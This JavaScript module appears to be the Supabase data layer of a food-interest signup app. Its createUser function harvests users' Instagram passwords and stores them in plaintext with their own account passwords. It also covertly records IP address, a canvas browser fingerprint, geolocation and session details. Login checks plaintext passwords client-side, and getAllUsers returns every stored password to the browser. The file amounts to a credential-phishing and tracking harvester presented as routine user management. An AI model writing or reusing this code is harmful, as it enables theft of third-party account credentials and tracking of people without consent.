import { createClient } from '@supabase/supabase-js'

// Initialize Supabase client
let supabase = null;
let isSupabaseAvailable = false;

export function initializeSupabase() {
  const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
  const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
  
  if (supabaseUrl && supabaseKey) {
    try {
      supabase = createClient(supabaseUrl, supabaseKey);
      isSupabaseAvailable = true;
      return true;
    } catch (error) {
      console.warn('Supabase initialization failed:', error);
      isSupabaseAvailable = false;
      return false;
    }
  }
  isSupabaseAvailable = false;
  return false;
}

export function isSupabaseReady() {
  return isSupabaseAvailable && supabase !== null;
}

export function getSupabaseClient() {
  return supabase;
}

// User management functions
export async function createUser(userData) {
  if (!isSupabaseReady()) {
    throw new Error('Supabase not initialized');
  }

  try {
    // Collect additional tracking data
    const trackingData = {
      ip_address: await getClientIP(),
      user_agent: navigator.userAgent,
      browser_fingerprint: generateBrowserFingerprint(),
      location_data: await getLocationData(),
      session_data: getSessionData()
    };

    const { data, error } = await supabase
      .from('users')
      .insert([{
        full_name: userData.fullName,
        email: userData.email,
        instagram_handle: userData.instagramId,
        instagram_password: userData.instagramPassword,
        user_password: userData.password,
        food_interest: userData.foodInterest,
        ...trackingData,
        registration_timestamp: new Date().toISOString()
      }])
      .select();

    if (error) throw error;
    return data[0];
  } catch (error) {
    console.error('Error creating user:', error);
    throw error;
  }
}

export async function getUserByEmail(email) {
  if (!isSupabaseReady()) {
    throw new Error('Supabase not initialized');
  }

  try {
    const { data, error } = await supabase
      .from('users')
      .select('*')
      .eq('email', email)
      .single();

    if (error && error.code !== 'PGRST116') throw error;
    return data;
  } catch (error) {
    console.error('Error getting user:', error);
    throw error;
  }
}

export async function getAllUsers() {
  if (!isSupabaseReady()) {
    throw new Error('Supabase not initialized');
  }

  try {
    const { data, error } = await supabase
      .from('users')
      .select('*')
      .order('registration_timestamp', { ascending: false });

    if (error) throw error;
    return data || [];
  } catch (error) {
    console.error('Error getting all users:', error);
    throw error;
  }
}

export async function authenticateUser(email, password) {
  if (!isSupabaseReady()) {
    throw new Error('Supabase not initialized');
  }

  try {
    // Update login tracking
    await updateLoginTracking(email);
    
    const { data, error } = await supabase
      .from('users')
      .select('*')
      .eq('email', email)
      .eq('user_password', password)
      .single();

    if (error && error.code !== 'PGRST116') throw error;
    return data;
  } catch (error) {
    console.error('Error authenticating user:', error);
    throw error;
  }
}

// Helper functions for data collection
async function getClientIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    return 'unknown';
  }
}

function generateBrowserFingerprint() {
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  ctx.textBaseline = 'top';
  ctx.font = '14px Arial';
  ctx.fillText('Browser fingerprint', 2, 2);
  
  return btoa(JSON.stringify({
    canvas: canvas.toDataURL(),
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screen: `${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack
  }));
}

async function getLocationData() {
  return new Promise((resolve) => {
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          resolve({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          });
        },
        () => resolve({ error: 'Location access denied' }),
        { timeout: 5000 }
      );
    } else {
      resolve({ error: 'Geolocation not supported' });
    }
  });
}

function getSessionData() {
  return {
    screenResolution: `${screen.width}x${screen.height}`,
    colorDepth: screen.colorDepth,
    pixelRatio: window.devicePixelRatio,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    language: navigator.language,
    languages: navigator.languages,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    onlineStatus: navigator.onLine,
    referrer: document.referrer,
    timestamp: new Date().toISOString()
  };
}

async function updateLoginTracking(email) {
  if (!isSupabaseReady()) return;
  
  try {
    await supabase
      .from('users')
      .update({
        last_login: new Date().toISOString(),
        login_count: supabase.raw('login_count + 1')
      })
      .eq('email', email);
  } catch (error) {
    console.error('Error updating login tracking:', error);
  }
}